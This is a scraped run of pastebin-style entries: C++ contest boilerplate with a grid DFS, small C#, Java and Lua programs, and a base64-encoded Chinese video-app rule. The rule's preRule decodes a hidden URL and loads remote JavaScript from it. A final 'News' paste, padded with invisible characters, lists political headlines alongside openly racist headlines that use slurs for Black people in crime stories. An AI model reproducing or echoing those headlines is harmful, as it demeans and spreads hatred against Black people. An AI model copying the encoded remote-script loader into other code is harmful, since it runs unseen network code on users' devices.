    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
N32PiDUW,Untitled,Sreekar_0125,C++,Saturday 19th of August 2023 10:15:27 AM CDT,"#include <bits/stdc++.h>
using namespace std;
// #define cerr if(false)cerr
#define int long long
#define pb push_back
#define F first
#define S second
#define yes cout << ""Yes\n""
#define no cout << ""No\n""
#define yn(x) x ? yes : no
#define f(i, s, e) for (int i = s; i < e; i++)
#define traverse(i, a) for (auto i : a)
#define set_bits(x) __builtin_popcountll(x)
#define leading_zero(x) __builtin_clz(x)
#define trailing_zero(x) __builtin_ctz(x)
#define vi vector<int>
#define vb vector<bool>
#define pii pair<int, int>
#define vpi vector<pii>
#define umi unordered_map<int, int>
#define mi map<int, int>
#define si set<int>
#define sc set<char>
#define maxheap priority_queue<int>
#define minheap priority_queue<int, vector<int>, greater<int>>
#define all(x) x.begin(), x.end()
#define minele(x) *min_element(all(x))
#define maxele(x) *max_element(all(x))
#define MOD 1000000007
#define endl '\n'

#ifndef ONLINE_JUDGE
#define debug(x)            \
    cerr << (#x) << "" is ""; \
    _print(x)
#define dbg(x) \
    cerr << (#x) << "" is "" << x << endl;
#else
#define debug(x)
#define dbg(x)
#endif

const int N = 2e5;

template <typename T>
void _print(T a)
{
    cerr << a;
}
template <typename T>
void print(T a)
{
    cout << a << ' ';
}
template <typename T>
void println(T a)
{
    cout << a << endl;
}

template <typename T>
void input(vector<T> &v)
{
    f(i, 0, (int)v.size()) cin >> v[i];
}

template <typename T>
void input(T &a)
{
    cin >> a;
}

template <typename T>
void print(vector<T> &v)
{
    f(i, 0, (int)v.size()) cout << v[i] << ' ';
    cout << endl;
}

template <class T, class V>
void _print(pair<T, V> p);
template <class T>
void _print(vector<T> v);
template <class T>
void _print(set<T> v);
template <class T, class V>
void _print(map<T, V> v);
template <class T>
void _print(multiset<T> v);
template <class T, class V>
void _print(pair<T, V> p)
{
    cerr << ""{"";
    _print(p.F);
    cerr << "","";
    _print(p.S);
    cerr << ""} "";
}
template <class T>
void _print(vector<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(set<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T>
void _print(multiset<T> v)
{
    cerr << ""[ "";
    for (T i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}
template <class T, class V>
void _print(unordered_map<T, V> v)
{
    cerr << ""[ "";
    for (auto i : v)
    {
        _print(i);
        cerr << "" "";
    }
    cerr << ""]"";
    cerr << endl;
}

/////////////Sieve///////////////
// vb sieve(N + 5, true);
// vi primes;
// void gensieve()
// {
//     sieve[0] = sieve[1] = false;
//     for (int i = 2; i <= sqrt(N); i++)
//     {
//         if (sieve[i])
//         {
//             for (int j = i * i; j <= N; j += i)
//                 sieve[j] = false;
//         }
//     }
//     for (int i = 2; i <= N; i++)
//     {
//         if (sieve[i])
//             primes.pb(i);
//     }
// }
////////////////////////////////

int binpow(int a, int b, int m)
{
    a %= m;
    int ans = 1;
    while (b > 0)
    {
        if (b & 1)
        {
            ans = (ans * a) % MOD;
        }
        a = (a * a) % MOD;
        b >>= 1;
    }
    return ans;
}

int modadd(int a, int b)
{
    return (a % MOD + b % MOD) % MOD;
}
int modsub(int a, int b)
{
    return ((a % MOD - b % MOD) % MOD + MOD) % MOD;
}
int modmul(int a, int b)
{
    return (a % MOD * b % MOD) % MOD;
}
int moddiv(int a, int b)
{
    return ((a % MOD) * (binpow(b, MOD - 2, MOD))) % MOD;
}

int lbnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] <= x)
        {
            ans = mid;
            low = mid + 1;
        }
        else
        {
            high = mid - 1;
        }
    }
    return ans;
}

int ubnd(vi &v, int x)
{
    int n = v.size();
    int low = 0;
    int high = n - 1;
    int ans = -1;
    while (low <= high)
    {
        int mid = (low + high) >> 1;
        if (v[mid] >= x)
        {
            ans = mid;
            high = mid - 1;
        }
        else
        {
            low = mid + 1;
        }
    }
    return ans;
}

vpi moves = {{0, 1}, {1, 0}, {0, -1}, {-1, 0}};
// vi graph[N + 1];
// vb visited(N + 1, false);
// vi parent(N + 1, -1);
// vi level(N + 1, 0);

// void bfs(vi *graph, vb &visited, vi &parent, vi &level, int start)
// {
//     queue<int> q;
//     visited[start] = true;
//     q.push(start);
//     while (!q.empty())
//     {
//         int node = q.front();
//         traverse(i, graph[node])
//         {
//             if (!visited[i])
//             {
//                 if (parent[i] == -1)
//                     parent[i] = node;
//                 if (level[i] == 0)
//                     level[i] = 1 + level[node];
//                 visited[i] = true;
//                 q.push(i);
//             }
//         }
//         q.pop();
//     }
// }

// void dfs(vi *graph, vb &visited, int start)
// {
//     visited[start] = true;
//     traverse(i, graph[start])
//     {
//         if (!visited[i])
//         {
//             visited[i] = true;
//             dfs(graph, visited, i);
//         }
//     }
// }

void fast()
{
    ios_base::sync_with_stdio(false);
    cin.tie(NULL);
    cout.tie(NULL);
}

void init_code()
{
#ifndef ONLINE_JUDGE
    freopen(""input.txt"", ""r"", stdin);
    freopen(""output.txt"", ""w"", stdout);
    freopen(""error.txt"", ""w"", stderr);
#endif // ONLINE_JUDGE
}

bool isValid(int a, int b, int n)
{
    return ((a < n && a >= 0) && (b < n && b >= 0));
}

void dfs(vector<vi> &grid, vector<vb> &visited, int a, int b, int &ans)
{
    visited[a][b] = true;
    ans++;

    for (auto i : moves)
    {
        int x = a + i.F;
        int y = b + i.S;
        if (isValid(x, y, grid.size()))
            if (!visited[x][y])
            {
                dfs(grid, visited, x, y, ans);
            }
    }

    return;
}

void solve()
{
    int n, a, b;
    cin >> n >> a >> b;
    a--;
    b--;

    vector<vi> grid(n, vi(n));
    vector<vb> visited(n, vb(n, false));

    int ans = 1;

    for (auto i : moves)
    {
        int x = 0;
        dfs(grid, visited, a, b, x);
        dbg(x);
        ans = max(ans, x);
    }
    println(ans);
}

signed main()
{
    init_code();
    fast();
    int t = 1;
    cin >> t;
    // gensieve();
    while (t--)
    {
        solve();
    }
    return 0;
}
"
8PdRBHi9,Untitled,Alexander_Maximov,C#,Saturday 19th of August 2023 10:04:07 AM CDT,"using System;
using System.Collections.Generic;

namespace Sortirovka
{
    public class Array
    {
        Random _random = new Random();

        public List<double> CreateNewArray()
        {
            List<double> newArray = new List<double>(40);

            for (int i = 0; i < newArray.Capacity; i++)
            {
                newArray.Add(Math.Round(_random.NextDouble() * 2, 1));
            }

            return newArray;
        }

        public List<double> CleanArray(List<double> array)
        {
            List<double> cleanArray = new List<double>();

            for (int i = 0; i < array.Count; i++)
            {
                if (array[i] % 1 == 0)
                {
                    cleanArray.Add(array[i]);
                }
            }

            return cleanArray;
        }

        public void ShowArray(List<double> array)
        {
            for (int i = 0; i < array.Count; i++)
            {
                Console.Write($""{array[i]} "");
            }
        }
    }
}"
SCnXYGKz,Untitled,Alexander_Maximov,C#,Saturday 19th of August 2023 10:03:44 AM CDT,"using System;
using System.Collections.Generic;

namespace Sortirovka
{
    internal class Program
    {
        public static void Main(string[] args)
        {
            Array array = new Array();
            List<double> newArray = new List<double>();
            newArray = array.CreateNewArray();
            array.ShowArray(newArray);
            Console.WriteLine();
            
            List<double> cleanArray = new List<double>();
            cleanArray = array.CleanArray(newArray);
            array.ShowArray(cleanArray);
        }
    }
}"
gV0C1pec,es2,davegimo,Java,Saturday 19th of August 2023 09:47:57 AM CDT,"class Node {

    public int value;
    public String q;
    public Node left;
    public Node right;

    public Node(int value, String q) {
        this.value = value;
        this.q = q;
        right = null;
        left = null;
    }
}


public class BinaryTree {

    public Node root;

    public Node addRecursive(Node current, int value, String q) {
        if (current == null) {
            return new Node(value,q);
        }
    
        if (value < current.value) {
            current.left = addRecursive(current.left, value, q);
        } else if (value >= current.value) {
            current.right = addRecursive(current.right, value, q);
        } else {
            // value already exists
            return current;
        }
    
        return current;
    }

    public void add(int value, String q) {
        root = addRecursive(root, value, q);
    }

   

    public static void main(String[] args) {
        BinaryTree bt = new BinaryTree();
    
        bt.add(170, ""albergo"");
        bt.add(130, ""campionato"");
        bt.add(90, ""fiume"");
        bt.add(20, ""patate"");
        bt.add(8, ""frutta"");
        bt.add(222, ""eletto"");
        bt.add(51, ""sentieri"");

        System.out.println(bt.root.left.left.value);
        System.out.println(bt.root.left.left.q);
        
    }
}"
q3L9misN,邀您一起看：关于我和鬼变成家人的那件事（时光影视）,xiaomianao666,JavaScript,Saturday 19th of August 2023 09:40:28 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥关于我和鬼变成家人的那件事（时光影视）@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxhc3RfY2hhcHRlcl9ydWxlXCI6XCJcIixcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInBhcmFtc1wiOlwie1xcXCJkZXNjXFxcIjpcXFwiSERUQ+S4reWtl1xcXCIsXFxcImltZ1xcXCI6XFxcImh0dHBzOi8vaW1nLmJmenlwaWMuY29tL3VwbG9hZC92b2QvMjAyMzA4MTAtMS84NjY1MDI2ZjEwZjdlNWQ1MGRkYWVmNTI3NzAxMzIzYi5qcGdAUmVmZXJlcj1cXFwiLFxcXCJwYWdlVGl0bGVcXFwiOlxcXCLlhbPkuo7miJHlkozprLzlj5jmiJDlrrbkurrnmoTpgqPku7bkuovvvIjml7blhYnlvbHop4bvvIlcXFwiLFxcXCJ0aXRsZVxcXCI6XFxcIuWFs+S6juaIkeWSjOmsvOWPmOaIkOWutuS6uueahOmCo+S7tuS6i1xcXCJ9XCIsXCJzYXZlZFwiOmZhbHNlLFwidGl0bGVcIjpcIumjjuW9sVwiLFwidmVyc2lvblwiOjAsXCJ1cmxcIjpcImhpa2VyOi8vZW1wdHkjI2h0dHA6Ly93d3cuc2hpZ3lzLmNvbS9pbmRleC5waHAvdm9kL2RldGFpbC9pZC81NDcxNS5odG1sI2ltbWVyc2l2ZVRoZW1lIyNhdXRvQ2FjaGUjO2dldDtVVEYtODt7VXNlci1BZ2VudEBNb3ppbGxhLzUuMCAoTGludXjvvJvvvJsgQW5kcm9pZCAxMe+8m++8myBNaSAxMCBQcm8pIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS84OC4wLjQzMjQuMTUyIE1vYmlsZSBTYWZhcmkvNTM3LjM2fVwiLFwiY29sX3R5cGVcIjpcIm1vdmllXzNcIixcImZpbmRfcnVsZVwiOlwianM6KFxcbigpID0+IHtcXG4gICAgcmVxdWlyZShjb25maWcu5L6d6LWWKTtcXG4gICAgZXJqaSgpO1xcbn1cXG4pKClcIixcImdyb3VwXCI6XCLikaDmjqjojZBcIixcInVhXCI6XCJtb2JpbGVcIixcInByZVJ1bGVcIjpcImxldCB0YWNpdGx5ID0gXFxcImFIUjBjSE02THk5bmFYUmpiMlJsTG01bGRDOXpkV2xtWlc0dmMzVnBabVZ1Wnk4dEwzSmhkeTl0WVhOMFpYSXZlV05zTG1welxcXCI7XFxubGV0IHljbCA9IGdldEl0ZW0oXFxcImdpdFxcXCIsIGJhc2U2NERlY29kZSh0YWNpdGx5KSk7XFxuaW5pdENvbmZpZyh7XFxuICAgIOS+nei1ljogeWNsXFxufSk7XCIsXCJwYWdlc1wiOlwiW11cIn0iLCJwaWNVcmwiOiJodHRwczovL2ltZy5iZnp5cGljLmNvbS91cGxvYWQvdm9kLzIwMjMwODEwLTEvODY2NTAyNmYxMGY3ZTVkNTBkZGFlZjUyNzcwMTMyM2IuanBnQFJlZmVyZXI9IiwidGl0bGUiOiLlhbPkuo7miJHlkozprLzlj5jmiJDlrrbkurrnmoTpgqPku7bkuovvvIjml7blhYnlvbHop4bvvIkifQ==
15QkMRpL,Untitled,kirkarr,Lua,Saturday 19th of August 2023 09:35:17 AM CDT,"local monitor = peripheral.find(""monitor"")
term.redirect(monitor)
term.clear()
local sx,sy = term.getSize()
while true do
	term.setCursorPos(1,1)
	term.write(textutils.formatTime(os.time()))
	term.setCursorPos(1,2)
	term.write(""Welcome to tea-bar"")  
	os.sleep(0.1)
end"
D41wAMrw,strhdygjklhgdfsdrghjk,crackanddie,Java,Saturday 19th of August 2023 09:00:02 AM CDT,"public static void main(String[] args) throws InterruptedException, IOException {

        Holder.LOG_LEVEL = Holder.LOG_ALL;
        RobocadVMXTitan robot = new RobocadVMXTitan(false);

        long millis = LocalTime.now(ZoneOffset.UTC).get(ChronoField.MILLI_OF_DAY);
        while (LocalTime.now(ZoneOffset.UTC).get(ChronoField.MILLI_OF_DAY) - millis < 20000)
        {
            robot.setMotorSpeed0(-20);
            robot.setMotorSpeed1(20);
        }
        robot.setMotorSpeed0(0);
        robot.setMotorSpeed1(0);
        Thread.sleep(1000);
        robot.stop();
    }"
70hv8cZY,News Aug19 23,Newscaster_Ned,Email,Saturday 19th of August 2023 08:59:17 AM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

W‎e‎l‎l‎ ‎2‎0‎2‎3‎ ‎i‎s‎ ‎t‎h‎e‎ ‎w‎o‎r‎s‎t‎ ‎y‎e‎a‎r‎ ‎e‎v‎e‎r‎!‎ ‎S‎u‎c‎k‎ ‎i‎t‎,‎ ‎2‎0‎2‎2‎!‎

H‎i‎l‎a‎r‎y‎ ‎C‎a‎t‎ ‎4‎

C‎o‎n‎e‎:‎ ‎S‎o‎c‎a‎l‎ ‎t‎o‎ ‎G‎e‎t‎ ‎C‎r‎u‎s‎h‎e‎d‎

F‎i‎r‎s‎t‎ ‎T‎r‎o‎p‎i‎c‎a‎l‎ ‎S‎t‎o‎r‎m‎ ‎W‎a‎t‎c‎h‎ ‎i‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎H‎i‎s‎t‎o‎r‎y‎

A‎r‎e‎ ‎T‎h‎e‎y‎ ‎R‎e‎a‎d‎y‎?‎
H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎ ‎(‎N‎O‎A‎A‎ ‎v‎i‎a‎ ‎A‎s‎s‎o‎c‎i‎a‎t‎e‎d‎ ‎P‎r‎e‎s‎s‎)‎
H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎H‎i‎l‎a‎r‎y‎ ‎r‎e‎a‎c‎h‎e‎d‎ ‎C‎a‎t‎e‎g‎o‎r‎y‎ ‎4‎ ‎s‎t‎a‎t‎u‎s‎ ‎o‎n‎ ‎F‎r‎i‎d‎a‎y‎ ‎m‎o‎r‎n‎i‎n‎g‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎ ‎N‎a‎t‎i‎o‎n‎a‎l‎ ‎H‎u‎r‎r‎i‎c‎a‎n‎e‎ ‎C‎e‎n‎t‎e‎r‎ ‎i‎s‎s‎u‎e‎d‎ ‎i‎t‎s‎ ‎f‎i‎r‎s‎t‎-‎e‎v‎e‎r‎ ‎t‎r‎o‎p‎i‎c‎a‎l‎ ‎s‎t‎o‎r‎m‎ ‎w‎a‎t‎c‎h‎ ‎f‎o‎r‎ ‎S‎o‎u‎t‎h‎e‎r‎n‎ ‎C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎,‎ ‎a‎s‎ ‎t‎h‎e‎ ‎e‎n‎t‎i‎r‎e‎ ‎s‎o‎u‎t‎h‎w‎e‎s‎t‎e‎r‎n‎ ‎r‎e‎g‎i‎o‎n‎ ‎b‎r‎a‎c‎e‎s‎ ‎f‎o‎r‎ ‎h‎e‎a‎v‎y‎ ‎r‎a‎i‎n‎s‎,‎ ‎h‎i‎g‎h‎ ‎s‎u‎r‎f‎,‎ ‎a‎n‎d‎ ‎f‎l‎a‎s‎h‎ ‎f‎l‎o‎o‎d‎i‎n‎g‎.‎

C‎o‎m‎e‎r‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎f‎o‎r‎ ‎V‎P‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎P‎s‎e‎u‎d‎o‎n‎y‎m‎:‎ ‎'‎R‎o‎b‎e‎r‎t‎ ‎L‎.‎ ‎P‎e‎t‎e‎r‎s‎'‎
C‎o‎m‎e‎r‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎f‎o‎r‎ ‎V‎P‎ ‎B‎i‎d‎e‎n‎'‎s‎ ‎S‎e‎c‎r‎e‎t‎ ‎P‎s‎e‎u‎d‎o‎n‎y‎m‎:‎ ‎'‎R‎o‎b‎e‎r‎t‎ ‎L‎.‎ ‎P‎e‎t‎e‎r‎s‎'‎
8‎,‎5‎5‎1‎

A‎r‎m‎e‎d‎ ‎I‎R‎S‎ ‎A‎g‎e‎n‎t‎ ‎A‎c‎c‎i‎d‎e‎n‎t‎a‎l‎l‎y‎ ‎K‎i‎l‎l‎s‎ ‎A‎n‎o‎t‎h‎e‎r‎ ‎A‎g‎e‎n‎t‎ ‎D‎u‎r‎i‎n‎g‎ ‎R‎a‎n‎g‎e‎ ‎T‎i‎m‎e‎
1‎,‎0‎9‎8‎
T‎r‎u‎m‎p‎ ‎C‎a‎n‎c‎e‎l‎s‎ ‎'‎M‎a‎j‎o‎r‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎f‎e‎r‎e‎n‎c‎e‎'‎ ‎o‎n‎ ‎L‎a‎t‎e‎s‎t‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎
T‎r‎u‎m‎p‎ ‎C‎a‎n‎c‎e‎l‎s‎ ‎'‎M‎a‎j‎o‎r‎ ‎N‎e‎w‎s‎ ‎C‎o‎n‎f‎e‎r‎e‎n‎c‎e‎'‎ ‎o‎n‎ ‎L‎a‎t‎e‎s‎t‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎
6‎,‎4‎0‎1‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎B‎i‎l‎l‎ ‎M‎a‎y‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎i‎z‎e‎ ‎P‎a‎r‎e‎n‎t‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎t‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎o‎a‎r‎d‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎
C‎a‎l‎i‎f‎o‎r‎n‎i‎a‎ ‎B‎i‎l‎l‎ ‎M‎a‎y‎ ‎C‎r‎i‎m‎i‎n‎a‎l‎i‎z‎e‎ ‎P‎a‎r‎e‎n‎t‎s‎'‎ ‎P‎r‎o‎t‎e‎s‎t‎s‎ ‎a‎t‎ ‎S‎c‎h‎o‎o‎l‎ ‎B‎o‎a‎r‎d‎ ‎M‎e‎e‎t‎i‎n‎g‎s‎
4‎5‎4‎

P‎o‎l‎l‎a‎k‎ ‎o‎n‎ ‎S‎a‎v‎a‎g‎e‎:‎ ‎T‎r‎u‎m‎p‎ ‎C‎o‎u‎l‎d‎ ‎T‎a‎k‎e‎ ‎O‎a‎t‎h‎ ‎o‎f‎ ‎O‎f‎f‎i‎c‎e‎ ‎i‎n‎ ‎P‎r‎i‎s‎o‎n‎ ‎a‎n‎d‎ ‎W‎a‎l‎k‎ ‎F‎r‎e‎e‎
9‎7‎4‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎:‎ ‎C‎o‎n‎t‎i‎n‎u‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎W‎i‎t‎c‎h‎ ‎H‎u‎n‎t‎ ‎-‎-‎ ‎T‎h‎e‎y‎’‎r‎e‎ ‎S‎i‎c‎k‎
T‎r‎u‎m‎p‎ ‎o‎n‎ ‎G‎e‎o‎r‎g‎i‎a‎ ‎I‎n‎d‎i‎c‎t‎m‎e‎n‎t‎:‎ ‎C‎o‎n‎t‎i‎n‎u‎a‎t‎i‎o‎n‎ ‎o‎f‎ ‎a‎ ‎W‎i‎t‎c‎h‎ ‎H‎u‎n‎t‎ ‎-‎-‎ ‎T‎h‎e‎y‎’‎r‎e‎ ‎S‎i‎c‎k‎
6‎,‎4‎1‎7‎
R‎e‎p‎o‎r‎t‎:‎ ‎M‎e‎d‎i‎a‎ ‎T‎y‎c‎o‎o‎n‎ ‎R‎u‎p‎e‎r‎t‎ ‎M‎u‎r‎d‎o‎c‎h‎ ‎P‎r‎o‎d‎d‎e‎d‎ ‎Y‎o‎u‎n‎g‎k‎i‎n‎ ‎t‎o‎ ‎L‎a‎u‎n‎c‎h‎ ‎W‎H‎ ‎B‎i‎d‎
R‎e‎p‎o‎r‎t‎:‎ ‎M‎e‎d‎i‎a‎ ‎T‎y‎c‎o‎o‎n‎ ‎R‎u‎p‎e‎r‎t‎ ‎M‎u‎r‎d‎o‎c‎h‎ ‎P‎r‎o‎d‎d‎e‎d‎ ‎Y‎o‎u‎n‎g‎k‎i‎n‎ ‎t‎o‎ ‎L‎a‎u‎n‎c‎h‎ ‎W‎H‎ ‎B‎i‎d‎
3‎3‎6‎

B‎o‎y‎c‎o‎t‎t‎ ‎O‎v‎e‎r‎:‎ ‎K‎i‎d‎ ‎R‎o‎c‎k‎ ‎D‎r‎i‎n‎k‎s‎ ‎B‎u‎d‎ ‎L‎i‎g‎h‎t‎ ‎A‎g‎a‎i‎n‎ ‎
5‎2‎8‎
P‎o‎l‎l‎:‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎S‎u‎r‎g‎e‎s‎ ‎t‎o‎ ‎S‎e‎c‎o‎n‎d‎ ‎P‎l‎a‎c‎e‎ ‎o‎v‎e‎r‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎,‎ ‎T‎r‎u‎m‎p‎ ‎U‎p‎ ‎4‎0‎
P‎o‎l‎l‎:‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎S‎u‎r‎g‎e‎s‎ ‎t‎o‎ ‎S‎e‎c‎o‎n‎d‎ ‎P‎l‎a‎c‎e‎ ‎o‎v‎e‎r‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎,‎ ‎T‎r‎u‎m‎p‎ ‎U‎p‎ ‎4‎0‎
1‎,‎8‎4‎4‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎S‎u‎p‎e‎r‎ ‎P‎A‎C‎ ‎P‎o‎s‎t‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎'‎H‎a‎m‎m‎e‎r‎'‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎i‎n‎ ‎D‎e‎b‎a‎t‎e‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎S‎a‎n‎t‎i‎s‎ ‎S‎u‎p‎e‎r‎ ‎P‎A‎C‎ ‎P‎o‎s‎t‎s‎ ‎P‎l‎a‎n‎ ‎t‎o‎ ‎'‎H‎a‎m‎m‎e‎r‎'‎ ‎R‎a‎m‎a‎s‎w‎a‎m‎y‎ ‎i‎n‎ ‎D‎e‎b‎a‎t‎e‎

C‎o‎u‎r‎t‎ ‎D‎o‎c‎u‎m‎e‎n‎t‎s‎ ‎R‎e‎l‎e‎a‎s‎e‎d‎ ‎D‎e‎s‎c‎r‎i‎b‎i‎n‎g‎ ‎B‎r‎u‎t‎a‎l‎ ‎M‎u‎r‎d‎e‎r‎ ‎o‎f‎ ‎E‎l‎d‎e‎r‎l‎y‎ ‎W‎h‎i‎t‎e‎ ‎C‎o‎u‎p‎l‎e‎ ‎i‎n‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎R‎e‎t‎i‎r‎e‎m‎e‎n‎t‎ ‎H‎o‎m‎e‎ ‎b‎y‎ ‎N‎e‎g‎r‎e‎s‎s‎.‎

W‎e‎l‎l‎ ‎m‎a‎y‎b‎e‎ ‎o‎n‎e‎ ‎d‎a‎y‎ ‎w‎e‎'‎l‎l‎ ‎f‎i‎n‎d‎ ‎o‎u‎t‎ ‎w‎h‎y‎ ‎t‎h‎i‎s‎ ‎b‎i‎t‎c‎h‎ ‎d‎i‎d‎ ‎t‎h‎i‎s‎.‎.‎.‎ ‎P‎r‎o‎b‎a‎b‎l‎y‎ ‎n‎o‎t‎.‎


H‎e‎a‎r‎t‎l‎e‎s‎s‎ ‎N‎e‎g‎r‎o‎ ‎K‎i‎l‎l‎s‎ ‎F‎a‎t‎h‎e‎r‎,‎ ‎4‎ ‎Y‎e‎a‎r‎-‎O‎l‎d‎,‎ ‎T‎h‎e‎n‎ ‎R‎i‎p‎s‎ ‎O‎u‎t‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎H‎e‎a‎r‎t‎ ‎a‎n‎d‎ ‎E‎a‎t‎s‎ ‎i‎t‎.‎


E‎x‎e‎c‎u‎t‎i‎o‎n‎ ‎D‎a‎t‎e‎ ‎S‎e‎t‎ ‎f‎o‎r‎ ‎C‎o‎o‎n‎ ‎W‎h‎o‎ ‎K‎i‎l‎l‎e‎d‎ ‎2‎ ‎W‎h‎i‎t‎e‎ ‎P‎e‎o‎p‎l‎e‎ ‎i‎n‎ ‎T‎h‎e‎i‎r‎ ‎F‎l‎o‎r‎i‎d‎a‎ ‎H‎o‎m‎e‎ ‎B‎e‎f‎o‎r‎e‎ ‎R‎o‎b‎b‎i‎n‎g‎ ‎a‎n‎o‎t‎h‎e‎r‎ ‎P‎l‎a‎c‎e‎.‎


M‎a‎n‎d‎i‎n‎g‎o‎ ‎C‎h‎a‎r‎g‎e‎d‎ ‎i‎n‎ ‎S‎l‎a‎y‎i‎n‎g‎ ‎o‎f‎ ‎(‎M‎u‎d‎s‎h‎a‎r‎k‎)‎ ‎B‎u‎s‎i‎n‎e‎s‎s‎ ‎P‎a‎r‎t‎n‎e‎r‎ ‎i‎n‎ ‎M‎o‎n‎t‎g‎o‎m‎e‎r‎y‎ ‎C‎o‎u‎n‎t‎y‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎d‎a‎y‎
P‎a‎r‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎
1‎0‎5‎°‎
/‎7‎6‎°‎
4‎%‎
S‎ ‎8‎ ‎m‎p‎h‎
S‎a‎t‎ ‎1‎9‎ ‎|‎ ‎D‎a‎y‎
1‎0‎5‎°‎
4‎%‎
S‎
8‎
 ‎
m‎p‎h‎
S‎o‎m‎e‎ ‎c‎l‎o‎u‎d‎s‎ ‎t‎h‎i‎s‎ ‎m‎o‎r‎n‎i‎n‎g‎ ‎w‎i‎l‎l‎ ‎g‎i‎v‎e‎ ‎w‎a‎y‎ ‎t‎o‎ ‎g‎e‎n‎e‎r‎a‎l‎l‎y‎ ‎s‎u‎n‎n‎y‎ ‎s‎k‎i‎e‎s‎ ‎f‎o‎r‎ ‎t‎h‎e‎ ‎a‎f‎t‎e‎r‎n‎o‎o‎n‎.‎ ‎N‎e‎a‎r‎ ‎r‎e‎c‎o‎r‎d‎ ‎h‎i‎g‎h‎ ‎t‎e‎m‎p‎e‎r‎a‎t‎u‎r‎e‎s‎.‎ ‎H‎i‎g‎h‎ ‎a‎r‎o‎u‎n‎d‎ ‎1‎0‎5‎F‎.‎ ‎W‎i‎n‎d‎s‎ ‎S‎ ‎a‎t‎ ‎5‎ ‎t‎o‎ ‎1‎0‎ ‎m‎p‎h‎.‎

H‎u‎m‎i‎d‎i‎t‎y‎
5‎5‎%‎
U‎V‎ ‎I‎n‎d‎e‎x‎
E‎x‎t‎r‎e‎m‎e‎
S‎u‎n‎r‎i‎s‎e‎
7‎:‎0‎0‎ ‎a‎m‎
S‎u‎n‎s‎e‎t‎
8‎:‎0‎7‎ ‎p‎m‎
